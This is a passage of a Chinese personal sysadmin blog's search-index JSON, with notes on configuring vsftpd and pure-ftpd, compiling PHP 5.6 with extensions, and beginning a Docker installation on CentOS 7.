db=/etc/vsftpd/vsftpd_login account required pam_userdb.so db=/etc/vsftpd/vsftpd_login [root@00 vsftpd]# vi vsftpd.conf anonymous_enable=NO local_enable=YES write_enable=NO anon_upload_enable=NO anon_mkdir_write_enable=NO anon_other_write_enable=NO anon_world_readable_only=NO reverse_lookup_enable=NO chroot_local_user=YES allow_writeable_chroot=YES guest_enable=YES guest_username=www pam_service_name=/etc/pam.d/vsftpd user_config_dir=/etc/vsftpd/user_conf xferlog_enable=YES xferlog_file=/var/log/vsftpd.log listen=YES listen_port=21 pasv_min_port=30000 pasv_max_port=30020 use_localtime=YES data_connection_timeout=180 [root@00 vsftpd]# mkdir /etc/vsftpd/user_conf [root@00 vsftpd]# vim ./user_conf/vsftpd01 local_root=/var/ftproot write_enable=YES anon_world_readable_only=NO anon_upload_enable=YES anon_mkdir_write_enable=YES anon_other_write_enable=YES [root@00 vsftpd]# touch ./user_conf/vsftpd02 ","date":"2019-03-05","objectID":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:2:3","tags":["linux","ftp","解决方案"],"title":"Vsftpd安装配置","uri":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"1.1.4. 修改selinux安全上下文(如果关闭selinux 忽略此步) [root@00 vsftpd]# getsebool -a|grep ftp ftpd_anon_write --\u003e off ftpd_connect_all_unreserved --\u003e off ftpd_connect_db --\u003e off ftpd_full_access --\u003e off ftpd_use_cifs --\u003e off ftpd_use_fusefs --\u003e off ftpd_use_nfs --\u003e off ftpd_use_passive_mode --\u003e off httpd_can_connect_ftp --\u003e off httpd_enable_ftp_server --\u003e off tftp_anon_write --\u003e off tftp_home_dir --\u003e off [root@00 vsftpd]# setsebool -P ftpd_full_access=on ","date":"2019-03-05","objectID":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:2:4","tags":["linux","ftp","解决方案"],"title":"Vsftpd安装配置","uri":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"1.1.5. 取消防火墙对于ftp的限制(firewalld ，iptables 请自行参考相关配置) [root@00 ~]# firewall-cmd --add-service=ftp success [root@00 ~]# firewall-cmd --add-service=ftp --permanent success ","date":"2019-03-05","objectID":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:2:5","tags":["linux","ftp","解决方案"],"title":"Vsftpd安装配置","uri":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"1.1.6. 重启vsftpd [root@00 vsftpd]# systemctl restart vsftpd #redhat7.x以下是service vsftpd restart [root@00 ~]# systemctl enable vsftpd # 将vsftpd加入开机启动 redhat7.x以下应该是chkconfig vsftpd add Created symlink /etc/systemd/system/multi-user.target.wants/vsftpd.service → /usr/lib/systemd/system/vsftpd.service. ","date":"2019-03-05","objectID":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:2:6","tags":["linux","ftp","解决方案"],"title":"Vsftpd安装配置","uri":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"2. 本地用户 本地用户和虚拟用户的区别只是在于配置文件和建设用户的区别 ","date":"2019-03-05","objectID":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:3:0","tags":["linux","ftp","解决方案"],"title":"Vsftpd安装配置","uri":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"2.1. 安装vsftpd ： [root@cloud ~]# yum install vsftpd 已加载插件：fastestmirror, langpacks Repository base is listed more than once in the configuration Repository updates is listed more than once in the configuration Repository extras is listed more than once in the configuration Repository centosplus is listed more than once in the configuration Loading mirror speeds from cached hostfile * base: mirrors.cqu.edu.cn * extras: mirror.lzu.edu.cn * updates: mirrors.sohu.com 正在解决依赖关系 ..........省部分内容............ 正在安装 : vsftpd-3.0.2-21.el7.x86_64 1/1 验证中 : vsftpd-3.0.2-21.el7.x86_64 1/1 已安装: vsftpd.x86_64 0:3.0.2-21.el7 完毕！ [root@cloud ~]# mv /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftpd.conf.bak #情况文件注释 此步骤可以不做 [root@cloud ~]# grep -v \"#\" /etc/vsftpd/vsftpd.conf.bak \u003e/etc/vsftpd/vsftpd.conf # 清空文件注释 此步骤可以不做 ","date":"2019-03-05","objectID":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:4:0","tags":["linux","ftp","解决方案"],"title":"Vsftpd安装配置","uri":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"2.1.1. 修改配置文件 [root@cloud vsftpd]# cat /etc/vsftpd/vsftpd.conf anonymous_enable=NO # 禁止匿名用户登录 local_enable=YES # 允许本地用户可登录ftp write_enable=YES # 允许上传写入 local_umask=022 #新建文件按权限 dirmessage_enable=NO #当使用者进入某个目录时，会显示该目录需要的注意内容，显示的档案预设信息是.message xferlog_enable=YES # 是否开启上传下载记录 xferlog_file=/var/log/xferlog # 日志位置 connect_from_port_20=YES # 启用默认端口 xferlog_std_format=YES # 好像是分析日志用的，具体不清楚 listen=NO listen_ipv6=YES chroot_local_user=YES #锁定用户在自己的家目录 allow_writeable_chroot=YES #让用户对主目录拥有可写权限（自2.3.5之后，vsftp增强了安全检查，如果用户被锁定在其主目录下，则该用户的主目录将不再具有写权限） pam_service_name=vsftpd # 限制file=/etc/vsftpd/ftpusers(具体文件位置，查看pam中的配置)中用户不允许登录ftp，此设置是在输入密码验证后判定 userlist_enable=YES #是否允许/etc/vsftpd/user_list 访问vsftpd服务，此设置是在用户输入用户名后判定 tcp_wrappers=YES #限制访问（/etc/hosts.allow,/etc/hosts.deny） ","date":"2019-03-05","objectID":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:4:1","tags":["linux","ftp","解决方案"],"title":"Vsftpd安装配置","uri":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"2.1.2. 修改selinux安全上下文，关闭的就不用管他了 [root@cloud vsftpd]# getsebool -a|grep ftp ftpd_anon_write --\u003e off ftpd_connect_all_unreserved --\u003e off ftpd_connect_db --\u003e off ftpd_full_access --\u003e off ftpd_use_cifs --\u003e off ftpd_use_fusefs --\u003e off ftpd_use_nfs --\u003e off ftpd_use_passive_mode --\u003e off httpd_can_connect_ftp --\u003e off httpd_enable_ftp_server --\u003e off tftp_anon_write --\u003e off tftp_home_dir --\u003e off [root@cloud vsftpd]# setsebool -P ftpd_full_access=on ","date":"2019-03-05","objectID":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:4:2","tags":["linux","ftp","解决方案"],"title":"Vsftpd安装配置","uri":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"2.1.3. 取消防火墙对于ftp的限制 [root@cloud vsftpd]# firewall-cmd --add-service=ftp success [root@cloud vsftpd]# firewall-cmd --add-service=ftp --permanent success 第五步：建立测试用户 [root@cloud vsftpd]# useradd -d /cloud_data/ftproot/7x24 -s /sbin/nologin 7x24 ","date":"2019-03-05","objectID":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:4:3","tags":["linux","ftp","解决方案"],"title":"Vsftpd安装配置","uri":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"2.1.4. 重启vsftpd并加入开机启动 [root@cloud vsftpd]# systemctl restart vsftpd #redhat7.x以下是service vsftpd restart [root@cloud vsftpd]# systemctl enable vsftpd # 将vsftpd加入开机启动 redhat7.x以下应该是chkconfig vsftpd add Created symlink /etc/systemd/system/multi-user.target.wants/vsftpd.service → /usr/lib/systemd/system/vsftpd.service. ","date":"2019-03-05","objectID":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:4:4","tags":["linux","ftp","解决方案"],"title":"Vsftpd安装配置","uri":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"3. 此处记录下pure-ftp的相关信息,以备查验 https://github.com/jedisct1/pure-ftpd ","date":"2019-03-05","objectID":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:5:0","tags":["linux","ftp","解决方案"],"title":"Vsftpd安装配置","uri":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"3.1. 编译参数 PureFTPd有很多的编译配置选项，下面就列出部分主要的配置 --prefix =PREFIX --with-sysquotas 使用系统磁盘配额 ( 非虚拟) --with-altlog 支持选择日志格式( 类似Apache) --with-puredb 支持虚拟用户 ( FTP登陆用户而非系统用户) --with-extauth 支持扩展验证模块 --with-pam 启用PAM验证支持 ( 默认=禁用) --with-cookie 启用Cookie支持 ( -F 选项) --with-throttling 支持带宽控制 ( 默认=禁用) --with-ratios 支持 上传/ 下载 速度控制 --with-quotas 支持 .ftpquota 文件（指定磁盘配额使用） --with-ftpwho 支持pure-ftpwho（查看在线用户的程序） --with-largefile 支持大于2G的文件 --with-welcomemsg 支持 welcome.msg 向后兼容（已经过时） --with-uploadscript 上传后允许执行外部脚本 ( 测试阶段) --with-virtualhosts 在不同的IP地址提供虚拟服务器功能 --with-virtualchroot 允许在chroot 的环境下通过符合连接跳转到外部 --with-diraliases 启用目录别名 --with-nonroot 普通模式或者说是限制模式. 如果你在该服务器上没有root权限 那只有启用该项 --with-peruserlimits 支持每个用户的并发限制 --with-language = 语言支持\u003c english | traditional-chinese | simplified-chinese\u003e --with-ldap 在LDAP目录中提供用户数据库 --with-mysql 在MySQL数据库中存放用户数据 --with-pgsql 在PostgreSQL数据库中存放用户数据 ","date":"2019-03-05","objectID":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:6:0","tags":["linux","ftp","解决方案"],"title":"Vsftpd安装配置","uri":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"3.2. 配置文件 # 限制所有用户在其主目录中 ChrootEveryone yes # 如果前一个指令被设置为了 \"no\"，下面组的成员(GID)就不受主目录的限制了。而其他的用户还是 # 会被限制在自己的主目录里。如果你不想把任何用户限制在自己的主目录里，只要注释掉 ChrootEveryone # 和 TrustedGID 就可以了。 # TrustedGID 100 # 兼容ie等比较非正规化的ftp客户端 BrokenClientsCompatibility no # 服务器总共允许同时连接的最大用户数 MaxClientsNumber 50 # 做为守护(doemon)进程运行(Fork in background) Daemonize yes # 同一IP允许同时连接的用户数（Maximum number of sim clients with the same IP address） MaxClientsPerIP 8 # 如果你要记录所有的客户命令，设置这个指令为 \"yes\"。 # This directive can be duplicated to also log server responses. VerboseLog no # 即使客户端没有发送 '-a' 选项也列出隐藏文件( dot-files )。 DisplayDotFiles yes # 不允许认证用户 - 仅作为一个公共的匿名FTP。 AnonymousOnly no # 不允许匿名连接，仅允许认证用户使用。 NoAnonymous no # Syslog facility (auth, authpriv, daemon, ftp, security, user, local*) # 缺省的功能( facility )是 \"ftp\"。 \"none\" 将禁止日志。 SyslogFacility ftp # 定制用户登陆后的显示信息（Display fortune cookies） # FortunesFile /usr/share/fortune/zippy # 在日志文件中不解析主机名。日志没那么详细的话，就使用更少的带宽。在一个访问量很大 # 的站点中，设置这个指令为 \"yes\" ，如果你没有一个能工作的DNS的话。 DontResolve yes # 客户端允许的最大的空闲时间（分钟，缺省15分钟） MaxIdleTime 15 # LDAP 配置文件 (参考 README.LDAP) # LDAPConfigFile /etc/pureftpd-ldap.conf # MySQL 配置文件 (参考 README.MySQL) # MySQLConfigFile /etc/pureftpd-mysql.conf # Postgres 配置文件 (参考 README.PGSQL) # PGSQLConfigFile /etc/pureftpd-pgsql.conf # PureDB 用户数据库 (参考 README.Virtual-Users) # PureDB /etc/pureftpd.pdb # pure-authd 的socket 路径(参考 README.Authentication-Modules) # ExtAuth /var/run/ftpd.sock # 如果你要启用 PAM 认证方式, 去掉下面行的注释。 # PAMAuthentication yes # 如果你要启用 简单的 Unix系统 认证方式(/etc/passwd), 去掉下面行的注释。 # UnixAuthentication yes # 请注意，LDAPConfigFile, MySQLConfigFile, PAMAuthentication 和 # UnixAuthentication 这些指令只能被使用一次，不过，他们能被混合在一起用。例如：如果你使用了 # MySQLConfigFile 和 UnixAuthentication，那么 SQL 服务器将被访问。如果因为用户名未找 # 到而使 SQL 认证失败的话，就会在/etc/passwd 和 /etc/shadow 中尝试另外一种认证，如果因 # 为密码错误而使 SQL 认证失败的话，认证就会在此结束了。认证方式由它们被给出来的顺序而被链 # 接了起来。 # 'ls' 命令的递归限制。第一个参数给出文件显示的最大数目。第二个参数给出最大的子目录深度。 LimitRecursion 2000 8 # 允许匿名用户创建新目录？ AnonymousCanCreateDirs no # 如果系统被 loaded 超过下面的值，匿名用户会被禁止下载。 MaxLoad 4 # 被动连接响应的端口范围。- for firewalling. # PassivePortRange 30000 50000 # 强制一个IP地址使用被动响应（ PASV/EPSV/SPSV replies）。 - for NAT. # Symbolic host names are also accepted for gateways with dynamic IP # addresses. # ForcePassiveIP 192.168.0.1 # 匿名用户的上传/下载的比率。 # AnonymousRatio 1 10 # 所有用户的上传/下载的比率。 # This directive superscedes the previous one. # UserRatio 1 10 # 不接受所有者为 \"ftp\" 的文件的下载。例如：那些匿名用户上传后未被本地管理员验证的文件。 AntiWarez yes # 客户端登录的时候的默认编码，开启这个选项的话，windows登录时就不会显示不了中文的了 ClientCharset gbk # 服务监听的IP 地址和端口。(缺省是所有IP地址和21端口) # Bind 127.0.0.1,21 # 匿名用户的最大带宽（KB/s）。 # AnonymousBandwidth 8 # 所有用户的最大带宽（KB/s），包括匿名用户。 # Use AnonymousBandwidth *or* UserBandwidth, both makes no sense. # UserBandwidth 8 # 新建目录及文件的属性掩码值。\u003c文件掩码\u003e;:\u003c目录掩码\u003e; . # 177:077 if you feel paranoid. Umask 133:022 # 认证用户允许登陆的最小组ID（UID） 。 MinUID 100 # 仅允许认证用户进行 FXP 传输。 AllowUserFXP yes # 对匿名用户和非匿名用户允许进行匿名 FXP 传输。 AllowAnonymousFXP no # 用户不能删除和写点文件（文件名以 '.' 开头的文件），即使用户是文件的所有者也不行。 # 如果 TrustedGID 指令是 enabled ，文件所属组用户能够访问点文件(dot-files)。 ProhibitDotFilesWrite no # 禁止读点文件（文件名以 '.' 开头的文件） (.history, .ssh...) ProhibitDotFilesRead no # 永不覆盖文件。当上传的文件，其文件名已经存在时，自动重命名，如： file.1, file.2, file.3, ... AutoRename no # 不接受匿名用户上传新文件( no = 允许上传) AnonymousCantUpload no # 仅允许来自以下IP地址的非匿名用户连接。你可以使用这个指令来打开几个公网IP来提供匿名FTP， # 而保留一个私有的防火墙保护的IP来进行远程管理。你还可以只允许一内网地址进行认证，而在另外 # 一个IP上提供纯匿名的FTP服务。 #TrustedIP 10.1.1.1 # 如果你要为日志每一行添加 PID 去掉下面行的注释。 # LogPID yes # 使用类似于Apache的格式创建一个额外的日志文件，如： # fw.c9x.org - jedi [13/Dec/1975] \"GET /ftp/linux.tar.bz2\" 200 21809338 # 这个日志文件能被 www 流量分析器处理。 # AltLog clf:/var/log/pureftpd.log # 使用优化过的格式为统计报告创建一个额外的日志文件。 # AltLog stats:/var/log/pureftpd.log # 使用标准的W3C格式创建一个额外的日志文件。（与大部分的商业日志分析器兼容） # AltLog w3c:/var/log/pureftpd.log # 不接受 CHMOD 命令。用户不能更改他们文件的属性。 # NoChmod yes # 允许用户恢复和上传文件，却不允许删除他们。 # KeepAllFiles yes # 用户主目录不存在的话，自动创建。 # CreateHomeDir yes # 启用虚拟的磁盘限额。第一个数字是最大的文件数。 # 第二个数字是最大的总的文件大小(单位：Mb)。 # 所以，1000:10 就限制每一个用户只能使用 1000 个文件，共10Mb。 # Quota 1000:10 # 如果你的 pure-ftpd 编译时加入了独立服务器( standalone )支持，你能够改变 pid 文件 # 的位置。缺省位置是 /var/run/pure-ftpd.","date":"2019-03-05","objectID":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:7:0","tags":["linux","ftp","解决方案"],"title":"Vsftpd安装配置","uri":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"Php安装维护","date":"2019-03-04","objectID":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/","tags":["linux","php"],"title":"Php安装维护","uri":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/"},{"categories":["linux","运维记事"],"content":" 前言 记录一个php的安装过程，仅作为个人使用记录，可参考 基础环境: CentOS 7.6 php 5.6.38 ","date":"2019-03-04","objectID":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/:0:0","tags":["linux","php"],"title":"Php安装维护","uri":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/"},{"categories":["linux","运维记事"],"content":"2. 安装 [root@00 ~]# mkdir /opt/software [root@00 ~]# cd /opt/software [root@00 software]# useradd -d /var/ftproot -s /sbin/nologin www [root@00 software]# yum install -y zlib-devel libxml2-devel libjpeg-devel libjpeg-turbo-devel freetype-devel libpng-devel gd-devel libcurl-devel libxslt-devel openssl openssl-devel mhash libmcrypt-devel mcrypt gcc glibc gcc-c++ [root@00 software]# wget https://ftp.gnu.org/pub/gnu/libiconv/libiconv-1.15.tar.gz --no-check-certificate [root@00 software]# tar xzf libiconv-1.15.tar.gz [root@00 software]# cd libiconv-1.15 [root@00 libiconv-1.15]# ./configure --prefix=/usr/local/libiconv [root@00 libiconv-1.15]# make \u0026\u0026 make install ## ---- 过程省略 ---- ## ## ---- 过程错误自行排查 ---- ## [root@00 libiconv-1.15]# cd /opt/software [root@00 software]# wget http://mirrors.sohu.com/php/php-5.6.38.tar.gz [root@00 software]# tar -xzf php-5.6.38.tar.gz [root@00 php-5.6.38]# cd php-5.6.38 ## 标准的生产环境编译参数(nginx) ## ------------------------ ## ## apache取消以下参数(apache+php时是不需要将php启动的，php是将模块直接编译进入apache的) ## --enable-opcache=no ## --enable-fpm ## --with-fpm-user=www ## --with-fpm-group=www ## 添加以下参数，指向apache的apxs ## --with-apxs2=/opt/apache/bin/apxs ## ------------------------ ## [root@00 php-5.6.38]# ./configure \\ --prefix=/opt/php5.6.38 \\ --with-config-file-path=/opt/php5.6.38/etc \\ --with-mysql=mysqlnd \\ --with-mysqli=mysqlnd \\ --with-pdo-mysql=mysqlnd \\ --with-iconv-dir=/usr/local/libiconv \\ --with-freetype-dir \\ --with-jpeg-dir \\ --with-png-dir \\ --with-zlib \\ --with-libxml-dir \\ --enable-xml \\ --disable-rpath \\ --disable-debug \\ --enable-bcmath \\ --enable-shmop \\ --enable-sysvsem \\ --enable-inline-optimization \\ --with-curl \\ --enable-mbregex \\ --enable-fpm \\ --enable-mbstring \\ --with-mcrypt \\ --with-gd \\ --enable-gd-native-ttf \\ --with-openssl \\ --with-mhash \\ --enable-pcntl \\ --enable-sockets \\ --with-xmlrpc \\ --enable-zip \\ --enable-soap \\ --enable-short-tags \\ --enable-static \\ --with-xsl \\ --with-fpm-user=www \\ --with-fpm-group=www \\ --enable-ftp \\ --enable-opcache=no # # --enable-opcache 此扩展可能不稳定，因此关闭， # 也可以使用--disable-opcache 进行关闭，默认是启用的 # (现当前版本不知道是否稳定些了) # # 5.3 添加的额外参数 # --with-curlwrappers # --enable-safe-mode # --enable-zend-multibyte [root@00 php-5.6.38]# make \u0026\u0026 make install ## ---- 过程省略 ---- ## ## ---- 过程错误自行排查 ---- ## [root@00 php-5.6.38]# cp -v ./php.ini-production /opt/php5.6.38/etc/php.ini [root@00 php-5.6.38]# cp -v /opt/php5.6.38/etc/php-fpm.conf.default /opt/php5.6.38/etc/php-fpm.conf [root@00 php-5.6.38]# ln -s /opt/php5.6.38/ /opt/php # 优化路径，用于后续可能的升级 ## --- 安装完成 --- ## 若需要将php-fpm 加入到系统服务当中， 在/opt/software/php-5.6.38/sapi/fpm目录下,将php-fpm.service文件中对应的${prefix}和${exec_prefix}改为程序编译后的对应目录，让后将文件cp到/usr/lib/systemd/system/下, 然后执行systemctl daemon-reload重加载即可，然后就可以使用systemctl {start|stop|restart} php-fpm.services 对php-fpm进行管理了(CentOS 6.x 的不知道) ","date":"2019-03-04","objectID":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/:1:0","tags":["linux","php"],"title":"Php安装维护","uri":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/"},{"categories":["linux","运维记事"],"content":"2.1 php 扩展编译 扩展安装的操作步骤(以xcache为例): 下载需要安装的扩展源码，解压进去后，先执行 /opt/php5.6.38/bin/phpize 生成configure配置文件 配置当前扩展编译./configure --enable-xcache --with-php-config=/opt/php5.6.38/bin/php-config 编译并安装 make \u0026\u0026 make install,编译并安装成功后会在/opt/php5.6.38/lib/php/extensions目录下生成对应目录，里面包含一个xcache.so的文件. ","date":"2019-03-04","objectID":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/:2:0","tags":["linux","php"],"title":"Php安装维护","uri":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/"},{"categories":["linux","运维记事"],"content":"3. 相关参数说明 ","date":"2019-03-04","objectID":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/:3:0","tags":["linux","php"],"title":"Php安装维护","uri":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/"},{"categories":["linux","运维记事"],"content":"3.1. php-fpm.conf pid = run/php-fpm.pid error_log = log/php-fpm.log user = www group = www # 设置接受 FastCGI 请求的地址 可为socket路径,(socket默认位置php根目录) listen = 127.0.0.1:9000 #允许连接到 FastCGI 的服务器 IPV4 地址 listen.allowed_clients = 127.0.0.1 # 设置进程管理器如何管理子进程，dynamic动态设置,必须配合 # pm.max_children，pm.start_servers，pm.min_spare_servers，pm.max_spare_servers参数进行设置 pm = dynamic # 设置最大可创建的子进程的数量(仅代表动态设置) pm.max_children = 300 # 设置启动时创建的子进程数目 pm.start_servers = 30 # pm.*_spare_servers 设置空闲服务进程的最低/最大数目 pm.min_spare_servers = 30 pm.max_spare_servers = 300 # 设置每个子进程重生之前服务的请求数 pm.max_requests = 65535 # 设置文件打开描述符的 rlimit 限制，默认系统定义值 rlimit_files = 65535 详细参数说明: https://secure.php.net/manual/zh/install.fpm.configuration.php ","date":"2019-03-04","objectID":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/:4:0","tags":["linux","php"],"title":"Php安装维护","uri":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/"},{"categories":["linux","运维记事"],"content":"4. windows_php iis 可直接安装为web-platfrom，然后搜索php manager https://www.iis.net/downloads/microsoft/web-platform-installer 若无法正常使用，需要先安装vc2012 故障: php7.x vc15安装时候只安装vc++ 2015不行(这个对应关系不是很清楚),此处安装2015、2017、2019、2022合并包后成功运行 若1无法安装，一般只是php manager无法安装，而url重写模块是安装好了的，这个时候直接去github上去下载一个整合的phpmanager，安装即可。 https://github.com/phpmanager/phpmanager/releases/tag/v2.0 上述第三步，也有可能url重写模块也未安装成功，这个时候需要去microsoft官网下载一个重写模块即可。另如果通过为web-platfrom安装phpmanager失败后安装的url重写模块，可能会导致iis中的.net程序异常，这个时候也需要手动卸载通过web-platfrom安装的url重写模块，然后安装microsoft下载的对应重写模块，理论上来说iis中安装的这个应该就是官网提供的，但是我遇到过的一次就是不行，卸载后重新安装官网的后,.net就正常了。 rewrite_x64_zh-CN.msi for microsoft rewrite_x86_zh-CN.msi for microsoft 扩展 pdo_sqlsrv (windows + drivers_3.2) 遇到了一个坑，php5.6添加pdo_sqlsrv模块无论是 nts 还是 ts的 ，从官方直接下载下来的 dll 打死进加载不了，后来找到了一个非官方的，导入进去，然后就可以了，我也是哔了狗了(这些模块的dll可以去phpstudy中copy，他们是集成好了的)。 ","date":"2019-03-04","objectID":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/:5:0","tags":["linux","php"],"title":"Php安装维护","uri":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/"},{"categories":["linux","运维记事"],"content":"5. 额外扩展 php memcache 扩展 wget http://pecl.php.net/get/memcache-2.2.7.tgz /opt/php-server/bin/phpize yum install re2c ./configure --enable-memcache --with-php-config=/opt/php-server/bin/php-config --with-zlib-dir make \u0026\u0026 make install extension=memcache.so php redis 扩展 # php redis 扩展, php 5.6 对应phpredis 5.0以下测试正常编译 wget https://github.com/phpredis/phpredis/archive/4.3.0.tar.gz /opt/php-server/bin/phpize ./configure --with-php-config=/opt/php-server/bin/php-config extension=redis.so memcache 管理工具 http://www.junopen.com/memadmin/ ","date":"2019-03-04","objectID":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/:6:0","tags":["linux","php"],"title":"Php安装维护","uri":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/"},{"categories":["linux","运维记事"],"content":"6. php版本选择 windos服务器： 如果你是PHP+IIS；请选择：PHP非线程安全（None Thread Safe(NTS)）； 如果你是PHP+apache；请选择：PHP线程安全（Thread Safe（TS）） linux服务器： linux服务器下的PHP，没有PHP线程安全和非线程安全版的区分 ","date":"2019-03-04","objectID":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/:7:0","tags":["linux","php"],"title":"Php安装维护","uri":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/"},{"categories":["linux","运维记事"],"content":"Docker 部署与常用操作","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/","tags":["linux","docker"],"title":"Docker 部署与常用操作","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":" Docker 是通过内核虚拟化技术(namespaces及cgroups等)来提供容器的资源隔离与安全保障等.由于docker通过操作系统层的虚拟化实现隔离,所以Dociker容器在运行时,不需要虚拟机(VM)额外的操作系统开销,提高资源利用率. 安装环境: CentOS 7 docker: 17.09.0-ce virtualbox: 5.1.30 ","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:0:0","tags":["linux","docker"],"title":"Docker 部署与常用操作","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"1. 前言 docker 能干什么? 简化配置 代码流水线管理 环境一致性,提高开发效率 快速部署 … ","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:1:0","tags":["linux","docker"],"title":"Docker 部署与常用操作","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"2. 安装并启动docker [root@00 ~]# yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo #导入docker源以便于安装最新版docker [root@00 ~]# yum install docker-ce -y #########忽略安装过程############# [root@00 ~]# systemctl start docker #启动docker ● docker.service - Docker Application Container Engine Loaded: loaded (/usr/lib/systemd/system/docker.service; disabled; vendor preset: disabled) Active: active (running) since 三 2017-10-25 01:30:27 EDT; 4min 2s ago Docs: https://docs.docker.com Main PID: 2788 (dockerd) Memory: 21.3M CGroup: /system.slice/docker.service ├─2788 /usr/bin/dockerd └─2793 docker-containerd -l unix:///var/run/docker/libcontainerd/docker-containerd.sock --metrics-interval=0 --start-time... #############省略部分数据################### [root@00 ~]# ifconfig docker0 # docker 安装成功后默认创建一个docker0默认的网桥 docker0: flags=4099\u003cUP,BROADCAST,MULTICAST\u003e mtu 1500 inet 172.17.0.1 netmask 255.255.0.0 broadcast 0.0.0.0 ether 02:42:72:b8:2a:55 txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0﻿​ ","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:2:0","tags":["linux","docker"],"title":"Docker 